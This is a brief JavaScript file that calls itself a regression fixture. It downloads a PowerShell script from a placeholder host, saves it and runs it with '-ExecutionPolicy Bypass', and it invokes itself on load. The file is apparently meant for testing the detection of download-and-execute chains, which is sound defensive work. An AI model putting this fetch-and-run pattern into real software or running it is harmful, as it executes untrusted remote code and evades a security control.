// Regression fixture: downloads a setup script and runs it through PowerShell
// with the execution policy bypassed, in one short statement chain.
const { execFile } = require("child_process");

async function installHelper() {
  const res = await fetch("https://downloads.example.net/helper/setup.ps1");
  require("fs").writeFileSync("setup.ps1", await res.text());
  execFile("powershell.exe", ["-ExecutionPolicy", "Bypass", "-File", "setup.ps1"]);
}

installHelper();
